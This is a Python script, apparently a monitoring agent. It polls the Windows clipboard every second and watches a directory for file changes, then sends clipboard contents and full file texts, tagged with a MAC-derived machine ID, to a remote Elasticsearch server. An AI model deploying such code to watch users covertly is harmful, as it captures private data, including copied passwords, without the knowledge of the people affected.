import datetime
import socket
import json
import time
import os
import json
from dotenv import load_dotenv
import watchdog.observers
import watchdog.events
import json
import uuid
import os
from pathlib import Path
from elasticsearch import Elasticsearch
import win32clipboard
from utils import (
    create_index_with_mapping,
    search_all_files,
    get_clipboard_data,
    get_file_size,
    parse_date
)
from threading import Thread

import logging
logger = logging.getLogger()

# INITIALIZING ENV
load_dotenv()
HOST = os.environ.get("ELASTIC_HOST")
CLIENT_ID = f"user_{str(uuid.getnode())}"
client_name = os.environ.get("CLIENT_NAME", CLIENT_ID)
EXTENSIONS = json.loads(os.environ.get("EXTENSIONS"))
DIRECTORY = os.environ.get("DIRECTORY_PATH", "./")

user_files_index = os.environ.get("USER_FILES_INDEX", "files")
user_clipboards_index = os.environ.get("USER_CLIPBOARD_INDEX", "clipboard")

# Initialize Elasticsearch client
try:
    es = Elasticsearch(HOST)
except Exception as e:
    logger.error(f"error while connect to Elastic {e.__str__()}")



def send_clipboard_data(data):
    doc = {
        'content': data,
        'client_id': CLIENT_ID,
        'client_name': client_name,
        'time': parse_date(f'{datetime.datetime.now():%Y-%m-%dT%H:%M:%S.%fZ}'),
    }
    es.index(index=user_clipboards_index, body=doc)


def clipboard_monitoring():
    cached_data = get_clipboard_data()
    send_clipboard_data(cached_data)
    while True:
        time.sleep(1)
        fresh_data = get_clipboard_data()
        if fresh_data != cached_data:
            logger.debug(f"{fresh_data} NOW IS GOING TO ELASTIC YOU, SNITCH!")
            send_clipboard_data(fresh_data)
            cached_data = fresh_data


class FileEventHandler(watchdog.events.PatternMatchingEventHandler):
    def __init__(self):
        watchdog.events.PatternMatchingEventHandler.__init__(self, patterns=EXTENSIONS,
                                                             ignore_directories=True,
                                                             case_sensitive=False)
        self.es = es
        self.index = user_files_index

    def on_created(self, event):
        if event.is_directory:
            return

        with open(event.src_path, 'r', encoding="utf-8") as file_content:
            content = file_content.read()

            doc = {
                'file_path': event.src_path,
                'content': content,
                'client_id': CLIENT_ID,
                'client_name': client_name,
                'file_name': Path(event.src_path).name,
                'extension': Path(event.src_path).suffix,
                'time': parse_date(f'{datetime.datetime.now():%Y-%m-%dT%H:%M:%S.%fZ}'),
                'file_size': get_file_size(event.src_path)
            }
            self.es.index(index=self.index, body=doc)
        file_path = event.src_path
        logger.debug(f"File created: {file_path}")

    def on_deleted(self, event):
        if event.is_directory:
            return
        self.es.delete_by_query(index=self.index,
                                body={"query": {"match": {"file_path":
                                                              event.src_path}}})
        logger.debug(f"File deleted: {event.src_path}")

    def on_modified(self, event):
        with open(event.src_path, 'r', encoding="utf-8") as file_content:
            content = file_content.read()
        doc = {
            'file_path': event.src_path,
            'content': content,
            'client_id': CLIENT_ID,
            'client_name': client_name,
            'file_name': Path(event.src_path).name,
            'extension': Path(event.src_path).suffix,
            'time': parse_date(f'{datetime.datetime.now():%Y-%m-%dT%H:%M:%S.%fZ}'),
            'file_size': get_file_size(event.src_path)
        }
        self.es.index(index=self.index, body=doc)
        logger.debug(f"File modified: {event.src_path}")


try:
    create_index_with_mapping(es, user_files_index)
    logger.debug(f"[INFO] FILES INDEX IS CREATED")
    logger.debug(f"[INFO] FILES INDEX IS CREATED")
    create_index_with_mapping(es, user_clipboards_index)
    logger.debug(f"[INFO] CLIPBOARD INDEX IS CREATED")
    logger.debug(f"[INFO] CLIPBOARD INDEX IS CREATED")


except Exception as e:
    logger.warning(e.__str__())
    logger.debug(f"[INFO] CLIPBOARD OR FILES INDEX IS ALREARY CREATED")
    pass  # TODO

search_all_files(es,
                 index=user_files_index,
                 directory=DIRECTORY,
                 extensions=EXTENSIONS,
                 CLIENT_ID=CLIENT_ID,
                 client_name=client_name)
thread = Thread(target=clipboard_monitoring, daemon=True)
thread.start()

logger.debug('Clipboard Thread is started ')

event_handler = FileEventHandler()
observer = watchdog.observers.Observer()
observer.schedule(event_handler, DIRECTORY, recursive=True)
observer.start()
logger.debug("Observer is started")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    observer.stop()
    observer.join()
    thread.join()
